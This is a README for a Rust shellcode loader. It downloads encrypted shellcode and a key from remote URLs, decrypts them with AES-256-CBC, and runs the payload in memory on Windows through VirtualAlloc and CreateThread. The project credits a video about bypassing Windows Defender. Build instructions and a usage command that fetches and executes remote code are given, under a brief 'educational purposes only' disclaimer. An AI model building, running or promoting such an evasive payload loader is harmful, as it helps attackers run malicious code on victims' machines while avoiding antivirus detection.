# AES-256-CBC Shellcode Decryptor and Executor in Rust

This Rust application fetches encrypted shellcode and an encryption key from provided URLs, decrypts the shellcode using AES-256-CBC, and executes it in memory on Windows systems. It utilizes PBKDF2-inspired concepts and Windows API calls for memory allocation and execution. This project was inspired by foundational knowledge from *Gemini Cyber Securityâ€™s* video *["Getting Started with Rust - Bypass Windows Defender"](https://www.youtube.com/watch?v=o8af1KeMrRc&t=95s)*.

> **Note:** This tool is intended for educational and security research purposes only. Use responsibly and in compliance with applicable laws.

## Features
- **AES-256-CBC Decryption**: Decrypts shellcode using the AES-256 algorithm in CBC mode.
- **Remote File Fetching**: Retrieves encrypted shellcode and keys from HTTP URLs using `reqwest`.
- **In-Memory Execution**: Allocates memory and executes decrypted shellcode via Windows API calls (`VirtualAlloc`, `VirtualProtect`, `CreateThread`).
- **Zero-Initialized IV**: Uses a static IV for simplicity (not recommended for production use).

## Prerequisites
### 1. Rust Installation
Ensure Rust is installed. If needed, install it via Rustup:

```sh
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

### 2. Windows OS
This project utilizes Windows-specific APIs (`windows-sys`) and is not compatible with other operating systems.

### 3. Internet Access
Required to fetch encrypted shellcode and key from provided URLs.

## Building the Project
### 1. Clone the Repository
```sh
git clone <repository_url>
cd <repository_name>
```

### 2. Install Dependencies
Ensure your `Cargo.toml` includes the following dependencies:

```toml
[dependencies]
aes = "0.8"
block-modes = "0.8"
pbkdf2 = "0.12"
sha2 = "0.10"
hex = "0.4"
hmac = "0.12"
reqwest = { version = "0.11", features = ["blocking"] }
windows-sys = { version = "0.52", features = ["Win32_Foundation", "Win32_System_Memory", "Win32_System_Threading"] }
```

Then, build the project in release mode:

```sh
cargo build --release
```

The compiled binary will be located in the `target/release` directory.

## Usage
Run the application with the following command, providing URLs to the encrypted shellcode and the encryption key:

```sh
./target/release/rust -exec <shellcode_url> <key_url>
```

### Example:
```sh
./target/release/rust -exec http://example.com/encrypted_shellcode http://example.com/key
```

This will:
1. Fetch the encrypted shellcode and key from the specified URLs.
2. Decrypt the shellcode using AES-256-CBC with a zero-initialized IV.
3. Allocate executable memory, copy the decrypted shellcode, and execute it as a new thread.

If successful, the program will output:
```
Decryption and execution succeeded.
```

## Security Considerations
- **Static IV**: The IV is set to zero, which compromises security by making the encryption predictable. For real-world use, a cryptographically secure random IV should be used.
- **Key Management**: The key is fetched remotely but not validated. Ensure the key source is trusted and secure.
- **Shellcode Execution**: Executing arbitrary code in memory can be dangerous and should only be done in controlled environments.
- **Error Handling**: Basic error reporting is implemented, but robust error handling should be added for production use.
